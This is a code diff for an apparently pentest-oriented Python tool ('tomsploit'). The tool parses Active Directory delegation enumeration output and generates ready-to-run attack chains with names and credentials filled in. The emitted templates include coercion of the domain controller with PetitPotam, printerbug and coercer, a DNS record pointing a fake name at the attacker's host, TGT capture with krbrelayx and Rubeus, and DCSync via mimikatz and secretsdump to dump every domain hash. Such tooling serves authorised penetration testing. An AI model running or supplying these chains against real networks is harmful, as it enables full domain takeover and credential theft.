     Never raises — a malformed template is skipped rather than allowed to
     break the whole report."""
@@ -1118,6 +1492,7 @@ def build_suggestions(s: Success, ip: str, hostname: str,
         ctx = build_context(s, ip, hostname, is_dc, domain_fallback)
     except Exception:
         return []
+    gated = bool(enrich is not None and getattr(enrich, "enriched", False))
     out: list[tuple[str, str]] = []
     for rule in SUGGEST_RULES:
         if rule.auth != s.auth_type or rule.proto != s.protocol:
@@ -1127,15 +1502,1266 @@ def build_suggestions(s: Success, ip: str, hostname: str,
         if rule.admin is not None and rule.admin != s.is_admin:
             continue
         for label, template in rule.commands:
+            key = _gate_key(label) if gated else None
+            if key == "delegation":
+                # Enrichment already ran --find-delegation; emit the matched
+                # branches instead of telling the operator to go run it.
+                dom_p = ctx["dom_plain"]
+                deleg_ctx = _deleg_ctx_from(ctx, s, ip, hostname, getattr(enrich, "maq", None))
+                rows = getattr(enrich, "deleg_rows", [])
+                if not deleg_inline:
+                    # Rendered as a compact summary + its own file by the
+                    # Reporter; emitting the full blocks here as well would
+                    # defeat the point.
+                    continue
+                if rows:
+                    out.extend((lb, cm, "")
+                               for lb, cm in suggest_for_delegation(
+                                   rows, deleg_ctx))
+                else:
+                    out.append(("delegation — none found",
+                                "# --find-delegation returned no abusable "
+                                "accounts on this domain.", ""))
+                continue
+            if key == "laps_gmsa" and not (
+                    getattr(enrich, "laps_hits", []) or
+                    getattr(enrich, "gmsa_hits", [])):
+                continue
+            if key == "adcs" and not getattr(enrich, "adcs_hits", []):
+                continue
             try:
                 cmd = template.format(**ctx)
             except Exception:
                 continue
             if s.local_auth:
                 cmd = _inject_local_auth(cmd)
-            out.append((label, cmd))
+            if not notes:
+                cmd = _strip_notes(cmd)
+                if not cmd.strip():
+                    continue          # the block was prose only
+            out.append((label, cmd, _hint_for(label)))
     return out
 
+
+# ─── Delegation enumeration → matched branch ───────────────────────────
+# The delegation rules above stop at "run the enumeration". This section
+# closes the loop: it parses findDelegation / nxc --find-delegation output
+# and emits ONLY the branch that applies, with account and target names
+# already filled in — "next command, not a manual".
+#
+# Two producers, two column vocabularies. Verified against source
+# (Pennyw0rth/NetExec nxc/protocols/ldap.py::find_delegation and
+# fortra/impacket examples/findDelegation.py):
+#
+#   impacket  Unconstrained | Constrained w/o Protocol Transition |
+#             Constrained w/ Protocol Transition | Resource-Based Constrained
+#             cols: AccountName AccountType DelegationType DelegationRightsTo
+#                   SPN Exists
+#   nxc       Unconstrained | Constrained | Constrained w/ Protocol Transition |
+#             Resource-Based Constrained
+#             cols: AccountName AccountType DelegationType DelegationRightsTo
+#
+# Note the disagreement on the NO-transition label (impacket spells it out,
+# nxc uses a bare "Constrained"). Both fold to DelegKind.CONSTRAINED. The
+# phrase table is ordered longest-first so the bare "constrained" substring
+# cannot steal a "w/ Protocol Transition" row.
+#
+# RBCD rows read INVERTED relative to the other three: AccountName is the
+# principal already ALLOWED TO ACT (delegate-from) and DelegationRightsTo is
+# the victim being acted upon (delegate-to). The emitter handles that so the
+# produced commands put each host in the right slot.
+
+
+class DelegKind(str, Enum):
+    UNCONSTRAINED = "unconstrained"
+    CONSTRAINED = "constrained"          # w/o protocol transition
+    CONSTRAINED_PT = "constrained_pt"    # w/ protocol transition (T2A4D)
+    RBCD = "rbcd"
+
+
+_TYPE_PHRASES: tuple[tuple[str, DelegKind], ...] = (
+    ("resource-based constrained", DelegKind.RBCD),
+    ("constrained w/ protocol transition", DelegKind.CONSTRAINED_PT),
+    ("constrained w/o protocol transition", DelegKind.CONSTRAINED),
+    ("unconstrained", DelegKind.UNCONSTRAINED),
+    # bare "constrained" LAST — nxc's no-transition label.
+    ("constrained", DelegKind.CONSTRAINED),
+)
+
+_ANY_PHRASE_RE = re.compile(
+    r"(resource-based constrained|constrained w/o protocol transition|"
+    r"constrained w/ protocol transition|unconstrained|constrained)",
+    re.IGNORECASE,
+)
+
+# nxc prefixes highlight lines with "LDAP <host> <port> <hostname>" and may
+# carry an nxc marker; strip both so column 0 is AccountName.
+_DELEG_PREFIX_RE = re.compile(
+    r"^\s*(?:LDAP\s+\S+\s+\d+\s+\S+\s+)?(?:\[[-+*!?]\]\s+)?")
+
+# Banner: LDAP <ip> <port> <hostname>. Match through the hostname token; the
+# remainder (attribute column, including its leading pad) is returned intact.
+_QUERY_BANNER_RE = re.compile(r"^\s*LDAP\s+\S+\s+\d+\s+\S+(?:\s+\[[-+*!?]\])?")
+
+_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
+
+
+@dataclass
+class DelegRow:
+    account: str            # AccountName (verbatim)
+    account_type: str       # AccountType (collapsed CN, or DN fragment)
+    kind: DelegKind
+    rights_to: list[str]    # DelegationRightsTo, split
+    raw: str = ""
+    # Filled by a second enrichment query (_enrich_roastability): the way INTO
+    # this account. own_spn is the SPN registered ON the account (kerberoastable
+    # if set); uac carries DONT_REQ_PREAUTH (AS-REP roastable). roast_checked
+    # distinguishes "checked, not roastable" from "never checked" so the
+    # emitters know whether to state a fact or fall back to a conditional.
+    own_spn: str = ""
+    uac: int = 0
+    roast_checked: bool = False
+    # msDS-AllowedToDelegateTo — the FULL constrained-delegation target list
+    # (findDelegation shows only the first). Lets DC-targeting detection and
+    # the "also reaches" list be authoritative rather than first-match.
+    allowed_to: list = field(default_factory=list)
+    # Direct-ACE write check (daclread, per account). None = not checked;
+    # [] = checked, no direct dangerous ACE; list = trustees with a direct write.
+    direct_writers: list | None = None
+
+    @property
+    def is_computer(self) -> bool:
+        return self.account.endswith("$") or "computer" in self.account_type.lower()
+
+    @property
+    def kerberoastable(self) -> bool:
+        return bool(self.own_spn)
+
+    @property
+    def asrep_roastable(self) -> bool:
+        return bool(self.uac & 0x400000)      # DONT_REQ_PREAUTH
+
+    @property
+    def disabled(self) -> bool:
+        return bool(self.uac & 0x2)           # ACCOUNTDISABLE — route is dead
+
+
+def _deleg_clean(line: str) -> str:
+    return _ANSI_RE.sub("", line).rstrip("\n")
+
+
+def _deleg_is_separator(line: str) -> bool:
+    s = line.strip()
+    return bool(s) and set(s) <= {"-", " "}
+
+
+def _deleg_split_rights(blob: str) -> list[str]:
+    """DelegationRightsTo may be 'N/A', one SPN, or several. nxc joins a list
+    with ', '; impacket separates with whitespace and rides its 'SPN Exists'
+    boolean at the end of the row. Split on commas/whitespace, drop a trailing
+    True/False, drop a bare N/A."""
+    parts = [p for p in re.split(r"[,\s]+", blob.strip()) if p]
+    if parts and parts[-1] in ("True", "False"):
+        parts = parts[:-1]
+    return [p for p in parts if p.upper() != "N/A"]
+
+
+# Access-mask names (from nxc daclread's SIMPLE_PERMISSIONS + object-ACE flags)
+# that grant a write powerful enough to matter for delegation abuse: setting an
+# SPN, writing msDS-AllowedToActOnBehalfOfOtherIdentity, or msDS-KeyCredentialLink.
+_DANGEROUS_WRITE = ("FullControl", "Modify", "ReadAndWrite", "Write",
+                    "WriteProperty", "WriteDacl", "WriteOwner", "GenericAll",
+                    "GenericWrite", "Self")
+
+
+def _clean_ext(s: str, maxlen: int = 256) -> str:
+    """Sanitize an externally-controlled string (an AD object name, a trustee,
+    an SPN — anything an attacker could set) before it enters the rendered
+    file. Newlines and control characters are the real risk: they can break a
+    value out of its comment line and land as executable text. shlex.quote
+    protects command ARGUMENTS, but these values also appear in comment lines
+    and prose, which are not quoted — so strip anything that could escape the
+    line, and cap the length so one absurd value cannot blow up the file."""
+    if not s:
+        return ""
+    # collapse any run of control chars (incl. newlines, tabs, ANSI, NUL) to a
+    # single space; keep printable content intact.
+    cleaned = _ANSI_RE.sub("", str(s))     # drop ANSI colour sequences whole
+    cleaned = _re_ctl.sub(" ", cleaned)    # then any remaining control chars
+    cleaned = cleaned.strip()
+    if len(cleaned) > maxlen:
+        cleaned = cleaned[:maxlen] + "…"
+    return cleaned
+
+
+_re_ctl = re.compile(r"[\x00-\x1f\x7f]+")
+
+
+def _clean_list(items, maxlen: int = 256) -> list:
+    """_clean_ext over a list, dropping empties."""
+    out = []
+    for it in (items or []):
+        c = _clean_ext(it, maxlen)
+        if c:
+            out.append(c)
+    return out
+
+
+def _parse_dacl_writers(text: str) -> list[str]:
+    """From nxc `-M daclread` output for ONE object, return the trustees that
+    hold a direct write-class ACE. daclread prints, per ACE, 'ACE[n] info' then
+    indented 'Trustee (name)  : <name>' and 'Access mask : <names> (0x..)'. We
+    pair each trustee with the mask that follows it and keep the dangerous ones.
+
+    This sees ONLY direct ACEs — daclread cannot resolve group-inherited rights
+    (its own docs say so), so a clean result does NOT mean 'no one can write',
+    only 'no DIRECT ACE'. The caller says as much and points at BloodHound."""
+    writers: list[str] = []
+    cur_trustee = ""
+    for raw in text.splitlines():
+        line = _ANSI_RE.sub("", raw)
+        low = line.lower()
+        if "trustee (name)" in low:
+            cur_trustee = line.split(":", 1)[1].strip() if ":" in line else ""
+        elif "access mask" in low and cur_trustee:
+            mask = line.split(":", 1)[1] if ":" in line else ""
+            if any(p in mask for p in _DANGEROUS_WRITE):
+                # strip a trailing SID in parens nxc appends to the name
+                name = _clean_ext(cur_trustee.split(" (")[0].strip(), 128)
+                if name and name.upper() not in ("UNKNOWN",) and name not in writers:
+                    writers.append(name)
+            cur_trustee = ""
+    return writers
+
+
+def _parse_maq(text: str) -> "int | None":
+    """Pull the integer from nxc `-M maq` output ('MachineAccountQuota: N')."""
+    if not text:
+        return None
+    m = _re_hints.search(r"MachineAccountQuota:\s*(\d+)", text)
+    return int(m.group(1)) if m else None
+
+
+def _parse_roast_sweep(text: str) -> list[str]:
+    """Account names from a domain-wide `--kerberoasting` run. nxc prints a
+    display line 'sAMAccountName: <name>, memberOf: ...' per roastable account
+    (verified against source). We collect those names; the TGS hashes go to the
+    file, which we ignore."""
+    names: list[str] = []
+    if not text:
+        return names
+    for raw in text.splitlines():
+        line = _ANSI_RE.sub("", raw)
+        m = _re_hints.search(r"sAMAccountName:\s*([^,]+?)(?:,|$)", line)
+        if m:
+            n = _clean_ext(m.group(1).strip(), 64)
+            if n and n not in names:
+                names.append(n)
+    return names
+
+
+def _parse_roast_query(text: str) -> dict[str, dict]:
+    """Parse `nxc ldap --query` output into {sAMAccountName_lower: {spn, uac}}.
+
+    nxc prints one block per object (verified against source
+    nxc/protocols/ldap.py::query):
+
+        [+] Response for object: CN=beth,...,DC=...
+        sAMAccountName       beth.richards
+        servicePrincipalName TERMSRV/DC01.INLANEFREIGHT.LOCAL
+                             TERMSRV/DC01
+        userAccountControl   590336
+
+    Attribute name is left-padded to 20 cols; a multi-valued attribute
+    continues on indented lines with a blank name. We track the current
+    attribute so continuation lines attach to it, and key each record by its
+    sAMAccountName (falling back to the DN's CN if the attribute is absent)."""
+    records: dict[str, dict] = {}
+    cur: dict | None = None
+    cur_attr = ""
+    cur_sam = ""
+
+    def commit():
+        nonlocal cur, cur_sam, cur_attr
+        if cur is not None:
+            key = (cur_sam or cur.get("_cn", "")).lower()
+            if key:
+                records[key] = {"spn": _clean_ext(cur.get("spn", ""), 128),
+                                "uac": cur.get("uac", 0),
+                                "allowed_to": _clean_list(cur.get("allowed_to", []), 128)}
+        cur = None
+        cur_sam = ""
+        cur_attr = ""
+
+    for raw in text.splitlines():
+        line = _ANSI_RE.sub("", raw).rstrip()
+        if not line.strip():
+            continue
+        marker, msg = parse_nxc_line(line)
+        low = line.lower()
+
+        # New object block: [+]/[*] "Response for object: <DN>"
+        if "response for object:" in low:
+            commit()
+            cur = {}
+            cur_attr = ""
+            cur_sam = ""
+            dn = line.split(":", 1)[1].strip() if ":" in line else ""
+            # first CN in the DN, best-effort fallback key
+            m = re.search(r"CN=([^,]+)", dn, re.IGNORECASE)
+            if m:
+                cur["_cn"] = m.group(1)
+            continue
+
+        if cur is None or marker is not None:
+            # status line ([+]/[-]) that is not an object header: ignore
+            continue
+
+        # Strip nxc's LDAP banner but KEEP the column padding after it: the
+        # 'LDAP <host> <port> <hostname> ' prefix is fixed-width, so a
+        # continuation line (blank attribute name) is distinguished from a new
+        # attribute only by the spaces that follow. The generic prefix regex
+        # eats trailing whitespace, so use a banner-only strip here.
+        m_ban = _QUERY_BANNER_RE.match(line)
+        body = line[m_ban.end():] if m_ban else line
+        if not body.strip():
+            continue
+        body = body.lstrip(" \t")            # normalise; we key on the token
+
+        # An attribute line starts with a known attribute name; anything else
+        # (while we are inside an object) is a continuation value of the
+        # current multi-valued attribute. This is robust to column padding.
+        _KNOWN_ATTRS = ("samaccountname", "serviceprincipalname",
+                        "useraccountcontrol", "msds-allowedtodelegateto")
+        first = body.split(None, 1)
+        head = first[0].lower() if first else ""
+        if head in _KNOWN_ATTRS:
+            cur_attr = first[0]
+            value = first[1].strip() if len(first) > 1 else ""
+        elif cur_attr.lower() == "msds-allowedtodelegateto":
+            # ONLY the multi-valued attribute takes continuation lines. A
+            # non-attribute line while a single-valued attr is current is
+            # noise/truncation — ignore it rather than clobber the value.
+            value = body.strip()
+        else:
+            continue
+
+        al = cur_attr.lower()
+        if al == "samaccountname":
+            if value:                          # never overwrite a good name with junk
+                cur_sam = value
+        elif al == "serviceprincipalname":
+            if value and not cur.get("spn"):
+                cur["spn"] = value          # first SPN is enough to prove roastable
+        elif al == "useraccountcontrol":
+            try:
+                cur["uac"] = int(value)
+            except ValueError:
+                pass
+        elif al == "msds-allowedtodelegateto":
+            # multi-valued: continuation lines append (handled by cur_attr)
+            cur.setdefault("allowed_to", [])
+            if value:
+                cur["allowed_to"].append(value)
+    commit()
+    return records
+
+
+def parse_delegation_output(text: str) -> list[DelegRow]:
+    """Parse pasted findDelegation / nxc --find-delegation table output.
+
+    Anchors on DelegationType (the only multi-word column) and splits around
+    it, so SPN lists containing spaces/commas survive intact. Returns [] on
+    anything unparseable — never raises."""
+    rows: list[DelegRow] = []
+    if not text:
+        return rows
+    for raw_line in text.splitlines():
+        line = _deleg_clean(raw_line)
+        if not line.strip() or _deleg_is_separator(line):
+            continue
+        if "delegationtype" in line.lower():      # header row
+            continue
+        m = _ANY_PHRASE_RE.search(line)
+        if not m:
+            continue
+        found = m.group(1).lower()
+        kind: DelegKind | None = None
+        for phrase, k in _TYPE_PHRASES:
+            if phrase in found:
+                kind = k
+                break
+        if kind is None:
+            continue
+
+        head = _DELEG_PREFIX_RE.sub("", line[: m.start()]).strip()
+        tail = line[m.end():].strip()
+        tokens = head.split()
+        if not tokens:
+            continue
+        rows.append(DelegRow(
+            account=_clean_ext(tokens[0], 64),
+            account_type=_clean_ext(" ".join(tokens[1:]) if len(tokens) > 1 else "", 128),
+            kind=kind,
+            rights_to=_clean_list(_deleg_split_rights(tail), 128),
+            raw=line,
+        ))
+    return rows
+
+
+# ── branch emitters ─
+# Each returns [(label, command)] in the same shape build_suggestions uses, so
+# the existing renderer prints them unchanged. Values that enumeration simply
+# cannot know (an uncracked password, a CA name, the DC's NetBIOS name) stay
+# as <ANGLE> literals — matching the rest of tomsploit, and keeping --sh mode
+# able to comment them out.
+
+def _safe_filename_part(s: str) -> str:
+    """A username may contain characters that are awkward or unsafe in a
+    filename (backslash from DOMAIN\\user, spaces, dots at the ends). Keep
+    it recognisable but filesystem-safe."""
+    s = (s or "").strip()
+    if "\\" in s:            # DOMAIN\user -> user
+        s = s.split("\\")[-1]
+    out = "".join(c if (c.isalnum() or c in "-_.") else "_" for c in s)
+    return out.strip("._") or ""
+
+
+def _deleg_known(ctx: dict) -> dict:
+    """Resolve the values the scan ALREADY established, so they stop being
+    placeholders. The DC's NetBIOS name and FQDN, the account you are
+    authenticating as and its secret are all known by the time delegation is
+    emitted — leaving them as <ANGLE> made the file look less finished than
+    it was and forced a manual substitution pass before anything would run.
+
+    Only genuinely unknowable values stay bracketed: a credential you have
+    not obtained yet, a ticket blob that does not exist until runtime, and
+    your own tunnel IP (which follows tomsploit's $LHOST convention)."""
+    dom = ctx.get("dom_plain") or "<DOMAIN>"
+    short = (ctx.get("dc_short") or "").strip()
+    fqdn = (ctx.get("dc_fqdn") or "").strip()
+    if not fqdn and short and dom != "<DOMAIN>":
+        fqdn = f"{short}.{dom}"
+    you = (ctx.get("deleg_user") or "").strip()
+    you_cred = (ctx.get("cred_flag") or "").strip()
+    secret = (ctx.get("cred_secret") or "").strip()
+    is_hash = bool(ctx.get("cred_is_hash"))
+    return {
+        "dom": dom,
+        "ip": ctx.get("ip") or "<DC-IP>",
+        "dc_nb": short or "<DC-NETBIOS>",
+        "dc_fqdn": fqdn or "<dc.fqdn>",
+        "you": you or "<you>",
+        "you_principal": (dom + chr(92) + you) if you else (dom + chr(92) + "<you>"),
+        "you_cred": you_cred or "-p '<PASSWORD>'",
+        # Raw secret + kind for non-impacket tools. When unknown (offline with
+        # no cred), fall back to a placeholder of the right shape.
+        "secret": secret or ("<nthash>" if is_hash else "<pw>"),
+        "is_hash": is_hash,
+        # An attacker-controlled DNS record name is arbitrary; emit a concrete
+        # one rather than a placeholder so the line runs as written.
+        "fake": "tomsploit01",
+    }
+
+
+def _route(get: str, required, missing, why: str = "") -> str:
+    """Standard header for every delegation route. Four factual fields, no
+    ranking — the operator decides which route to take, the tool states what
+    each one is:
+
+        GET      — what you end up holding if the steps succeed
+        REQUIRED — the COMPLETE prerequisite list to run these commands
+        MISSING  — the subset of REQUIRED you do NOT yet hold, each with the
+                   way to get it; or "nothing — every prerequisite is met" when
+                   the block is runnable as written
+        WHY      — mechanism, only where it is not obvious from the commands
+
+    required/missing may be a string or a list of strings (rendered as
+    sub-bullets). MISSING is what makes the file actionable: it separates
+    'this needs a hash you have not cracked' from 'run this now'."""
+    def block(tag: str, val) -> list[str]:
+        if isinstance(val, (list, tuple)):
+            val = [v for v in val if v]
+            if not val:
+                return []
+            head = f"# {tag:<8}: {val[0]}"
+            rest = [f"#           {v}" for v in val[1:]]
+            return [head, *rest]
+        return [f"# {tag:<8}: {val}"] if val else []
+
+    out = block("GET", get) + block("REQUIRED", required) + block("MISSING", missing)
+    if why:
+        out += block("WHY", why)
+    return "\n".join(out) + "\n#\n"
+
+
+def _deleg_account_is_self(account: str, ctx: dict) -> bool:
+    """True when the delegating account IS the account the scan authenticated
+    as — so its secret is ALREADY HELD and the tool must not tell you to
+    kerberoast for a password you logged in with. Case-insensitive, tolerant
+    of the trailing $ on a machine account."""
+    you = (ctx.get("deleg_user") or "").strip().lower()
+    if not you or you.startswith("<"):
+        return False
+    a = (account or "").strip().lower()
+    return a == you or a.rstrip("$") == you.rstrip("$")
+
+
+def _missing_secret(row: DelegRow, ctx: dict | None = None) -> str:
+    """The MISSING line for an account whose secret you do not hold. Returns ""
+    when the secret is ALREADY HELD (the account is the one you authenticated
+    as), so the caller reports 'nothing' instead of a roast command."""
+    if ctx is not None and _deleg_account_is_self(row.account, ctx):
+        return ""
+    acct = row.account
+    host = acct.rstrip("$")
+    if row.roast_checked:
+        if row.kerberoastable:
+            return f"{acct}'s secret — kerberoast now (cmd below)"
+        if row.asrep_roastable:
+            return f"{acct}'s secret — AS-REP roast now (cmd below)"
+        if not row.is_computer:
+            return f"{acct}'s secret — not roastable; plant an SPN (GenericWrite) or dump"
+        return f"{acct}'s hash — dump, or SYSTEM on {host}"
+    # unchecked (offline --deleg-in): state the conditional honestly
+    if row.is_computer:
+        return f"{acct}'s hash — dump, SYSTEM on {host}, or RBCD onto it"
+    return f"{acct}'s secret — kerberoast if it has an SPN, else dump"
+
+
+def _coerce_block(ctx: dict, listener: str, as_comment: bool = False) -> str:
+    """The actual coercion command — the step every unconstrained write-up
+    hand-waves as 'coerce the DC'. Fires PetitPotam/PrinterBug/etc at the DC
+    so it authenticates to LISTENER. nxc's coerce_plus tries every method and
+    reports which land; a single method via the standalone tools is the
+    fallback. `listener` is the name/IP the DC will authenticate to (for the
+    unconstrained chain this MUST be the krbrelayx host's name, so its SPN
+    resolves)."""
+    k = _deleg_known(ctx)
+    you, cred, ip, dom = k["you"], k["you_cred"], k["ip"], k["dom"]
+    secret, is_hash = k["secret"], k["is_hash"]
+    p = "# " if as_comment else ""
+
+    # Each tool takes the credential differently. Use the SAME secret we
+    # authenticated with, formatted per tool, so these run as written.
+    # PetitPotam / coercer: -hashes LM:NT or -p pass. printerbug: it goes in the
+    # domain/user:pass target string and does not take a hash, so for a
+    # hash-only cred we say so rather than emit a broken line.
+    if is_hash:
+        pp_cred = f"-hashes {secret}"
+        co_cred = f"-hashes {secret}"
+        pb_line = (f"{p}#   printerbug.py takes a password, not a hash — use "
+                   f"PetitPotam/coercer above, or pass -hashes via its "
+                   f"impacket build\n")
+    else:
+        pp_cred = f"-p {q(secret)}"
+        co_cred = f"-p {q(secret)}"
+        pb_line = (f"{p}#   printerbug.py "
+                   f"{q(dom + '/' + you + ':' + secret)}@{ip} {listener}\n")
+
+    return (
+        f"{p}# find which coercion methods work, firing at your listener:\n"
+        f"{p}nxc smb {ip} -u {you} {cred} -M coerce_plus -o LISTENER={listener}\n"
+        f"{p}# or a single method with the standalone tools (any ONE):\n"
+        f"{p}python3 PetitPotam.py -u {you} {pp_cred} {listener} {ip}\n"
+        + pb_line
+        + f"{p}#   coercer.py coerce -u {you} {co_cred} -t {ip} -l {listener}\n")
+
+
+def _missing_or_nothing(items, row: DelegRow, ctx: dict):
+    """Finalize a MISSING list: drop satisfied (empty) entries; if none remain,
+    state it positively — naming WHY when the account is the one you
+    authenticated as."""
+    items = [i for i in items if i]
+    if items:
+        return items
+    if _deleg_account_is_self(row.account, ctx):
+        return f"nothing — held (you are authenticated as {row.account})"
+    return "nothing — commands below run as-is"
+
+
+def _unconstrained_user_missing(row: DelegRow, ctx: dict | None = None):
+    """MISSING for unconstrained delegation on a USER. Two prerequisites — the
+    secret and an SPN on the account — and the roast query resolved BOTH: it
+    pulled servicePrincipalName, so we know whether the SPN exists."""
+    out = [_missing_secret(row, ctx)]
+    if row.roast_checked:
+        if row.own_spn:
+            out.append(f"SPN — present ({_clean_ext(row.own_spn)}), nothing to add")
+        else:
+            _dw_raw = getattr(row, "direct_writers", None)
+            dw = _clean_list(_dw_raw)
+            if dw:
+                out.append(f"SPN — none; but {', '.join(dw)} can write it "
+                           f"(add an SPN, then roast)")
+            elif _dw_raw == []:
+                out.append("SPN — none, and no DIRECT write ACE (group rights "
+                           "invisible to daclread — check BloodHound), else dead")
+            else:
+                out.append("SPN — none; add one (needs GenericWrite) or dead")
+    else:
+        out.append("SPN — verify with the query below")
+    return out
+
+
+def _emit_unconstrained(row: DelegRow, ctx: dict) -> list[tuple[str, str]]:
+    """Unconstrained delegation. A COMPUTER account is a host you can land on
+    and run a TGT catcher from. A USER account is not — there is no shell to
+    get; it is a service identity, and abusing it means holding its
+    credential and standing the service up yourself."""
+    k = _deleg_known(ctx)
+    dom, ip = k["dom"], k["ip"]
+    acct = row.account
+    dnsline = (f"python3 dnstool.py -u {q(k['you_principal'])} {k['you_cred']} \\\n"
+               f"  -r {k['fake']}.{dom} -d $LHOST -a add {ip}")
+
+    if row.is_computer:
+        host = acct.rstrip("$")
+        return [(
+            f"UNCONSTRAINED on {host} (computer) — capture a DC TGT",
+            _route(
+                get="DCSync — every hash in the domain (incl. krbtgt)",
+                required=[f"SYSTEM on {host}, or {host}'s machine hash",
+                          "ability to coerce the DC"],
+                missing=f"a foothold on {host} — you hold neither yet "
+                        f"(a payoff for a host you own, not a way in)",
+                why=f"{acct} decrypts any TGT forwarded to it, and it is not "
+                    f"a DC — so coerce the DC to it and catch the TGT")
+            + f"# ══ PATH (a): you have an elevated shell ON {host} ══\n"
+              f"# 1. start the catcher on {host} (elevated PowerShell), leave running:\n"
+              f"Rubeus.exe monitor /interval:5 /nowrap /filteruser:{k['dc_nb']}$\n"
+              f"# 2. from Kali, coerce the DC to authenticate to {host}:\n"
+              + _coerce_block(ctx, host)
+              + f"# 3. Rubeus prints a base64 TGT for {k['dc_nb']}$ — copy it, then\n"
+              f"#    on {host} inject it:\n"
+              f"Rubeus.exe ptt /ticket:<base64-blob>\n"
+              f"# 4. with the DC TGT in memory, DCSync from {host}:\n"
+              f"Rubeus.exe ptt /ticket:<base64-blob> ; "
+              f"mimikatz # lsadump::dcsync /domain:{dom} /all\n"
+              f"#\n"
+              f"# ══ PATH (b): you have {host}'s machine hash, working from Kali ══\n"
+              f"# 1. start krbrelayx in the FOREGROUND with the machine key; it\n"
+              f"#    listens and writes a .ccache when a TGT arrives (krbrelayx is\n"
+              f"#    dirkjanm's, NOT impacket; capture mode takes NO -t):\n"
+              f"krbrelayx.py -hashes :<{host}-nthash>\n"
+              f"# 2. add a DNS record so the DC can resolve your listener by NAME\n"
+              f"#    (an IP forces NTLM = no forwarded TGT):\n"
+              f"{dnsline}\n"
+              f"# 3. coerce the DC to that NAME (run in a second terminal):\n"
+              + _coerce_block(ctx, k['fake'] + '.' + dom)
+              + f"# 4. krbrelayx drops '{k['dc_nb']}$@{dom}.ccache' — use it to DCSync:\n"
+              f"export KRB5CCNAME='{k['dc_nb']}$@{dom}.ccache'\n"
+              f"impacket-secretsdump -k -no-pass -just-dc {k['dc_fqdn']}",
+        )]
+
+    return [(
+        f"UNCONSTRAINED on {acct} (user) — capture a DC TGT",
+        _route(
+            get="DCSync — every hash in the domain (incl. krbtgt)",
+            required=[f"{acct}'s secret", f"an SPN on {acct}"],
+            missing=_unconstrained_user_missing(row, ctx),
+            why=f"a user only receives a forwarded TGT when a client "
+                f"authenticates to one of its SPNs, so you must become that "
+                f"service")
+        + _deleg_getcred_block(row, ctx)
+        + f"# 1. with {acct}'s hash, start krbrelayx in the FOREGROUND — it\n"
+          f"#    decrypts the forwarded TGT with the account key and writes a\n"
+          f"#    .ccache (krbrelayx is dirkjanm's, not impacket):\n"
+          f"krbrelayx.py -hashes :<{acct}-nthash>\n"
+          f"# 2. point one of {acct}'s SPN hostnames at you via DNS, so the\n"
+          f"#    coerced auth reaches your listener as Kerberos:\n"
+          f"{dnsline}\n"
+          f"# 3. coerce the DC to that SPN name (second terminal):\n"
+          + _coerce_block(ctx, k['fake'] + '.' + dom)
+          + f"# 4. krbrelayx writes '{k['dc_nb']}$@{dom}.ccache' — DCSync with it:\n"
+          f"export KRB5CCNAME='{k['dc_nb']}$@{dom}.ccache'\n"
+          f"impacket-secretsdump -k -no-pass -just-dc {k['dc_fqdn']}",
+    )]
+
+
+def _spn_host_is_dc(spn_host: str, ctx: dict) -> bool:
+    """True when a delegation SPN points at the domain controller itself.
+
+    This is the difference between a lateral move and instant domain
+    compromise: sname substitution can change the service CLASS but not the
+    HOST (the ticket is encrypted with that host's key). If the host is
+    already the DC, swapping to ldap/ turns the ticket into DCSync."""
+    if not spn_host:
+        return False
+    h = spn_host.lower().rstrip(".")
+    short = h.split(".", 1)[0]
+    dc_fqdn = (ctx.get("dc_fqdn") or "").lower().rstrip(".")
+    dc_short = (ctx.get("dc_short") or "").lower()
+    return bool((dc_fqdn and h == dc_fqdn) or (dc_short and short == dc_short))
+
+
+def _impacket_self(ctx: dict) -> str:
+    """The identity + auth for an impacket tool authenticating as the OPERATOR
+    (the account the scan ran as). impacket example scripts (rbcd, addcomputer,
+    getST, secretsdump, ...) take the password in the identity positional as
+    domain/user:password — they have NO -p flag. So a password credential must
+    be embedded, not passed as a flag; a hash uses -hashes. Verified against
+    fortra/impacket rbcd.py + addcomputer.py.
+
+    Returns e.g.  'CORP.LOCAL/operator:P@ss'   or
+                  'CORP.LOCAL/operator' -hashes :abc123
+    Falls back to a placeholder identity when the secret is not known."""
+    dom = ctx.get("dom_plain") or "<DOMAIN>"
+    you = (ctx.get("deleg_user") or "").strip() or "<you>"
+    secret = (ctx.get("cred_secret") or "").strip()
+    principal = f"{dom}/{you}"
+    if not secret:
+        return q(f"{principal}:<PASSWORD>")          # unknown (offline)
+    if ctx.get("cred_is_hash"):
+        return f"{q(principal)} -hashes :{secret}"
+    return q(f"{principal}:{secret}")
+
+
+def _getst_auth(dom: str, account: str, row: "DelegRow | None" = None,
+                known_pw: str = "", ctx: dict | None = None) -> str:
+    """The identity + auth portion of an impacket getST command.
+
+    getST has NO -p flag (verified against source: the only auth options are
+    -hashes / -aesKey / -k -no-pass). A PASSWORD must go INSIDE the identity
+    positional as domain/user:password. This returns, correctly quoted:
+
+        'DOM/beth:<beth-PASSWORD>'                 user, password (from a roast)
+        'DOM/DMZ01$' -hashes :<DMZ01-nthash>       machine, hash (from a dump)
+        'DOM/TOMPC$:TomsploitAdd1!'                a password you already hold
+
+    A machine account defaults to the -hashes form because its cleartext is
+    random and rotated; a user to the identity-password form because that is
+    what cracking a roast yields. Either can be swapped for any other auth form
+    per the file header — this is just the one you are likeliest to hold."""
+    principal = f"{dom}/{account}"
+    # If this IS the account we authenticated as, we hold its real secret — use
+    # it, so the command runs with no placeholder and no roast step.
+    if ctx is not None and _deleg_account_is_self(account, ctx):
+        secret = (ctx.get("cred_secret") or "").strip()
+        if secret:
+            if ctx.get("cred_is_hash"):
+                return f"{q(principal)} -hashes :{secret}"
+            return q(f"{principal}:{secret}")
+    if known_pw:
+        return q(f"{principal}:{known_pw}")
+    if row is not None and row.is_computer:
+        return f"{q(principal)} -hashes :<{account.rstrip('$')}-nthash>"
+    return q(f"{principal}:<{account}-PASSWORD>")
+
+
+def _deleg_getcred_block(row: DelegRow, ctx: dict) -> str:
+    """When the roast check has RESOLVED how to get into this account, emit the
+    exact command that yields its credential. Returns '' when nothing definite
+    is known (unchecked, or checked and not roastable) — the caller then keeps
+    the conditional HOW text as a fallback.
+
+    This is the loop closer: 'kerberoast it if it holds an SPN' becomes the
+    kerberoast command with the account already filled in, because the scan
+    already confirmed the SPN is there."""
+    if _deleg_account_is_self(row.account, ctx):
+        return ""          # you authenticated AS this account — you have its secret
+    if not row.roast_checked:
+        return ""
+    k = _deleg_known(ctx)
+    you, cred, ip, dom = k["you"], k["you_cred"], k["ip"], k["dom"]
+    acct = row.account
+
+    if row.kerberoastable:
+        return (
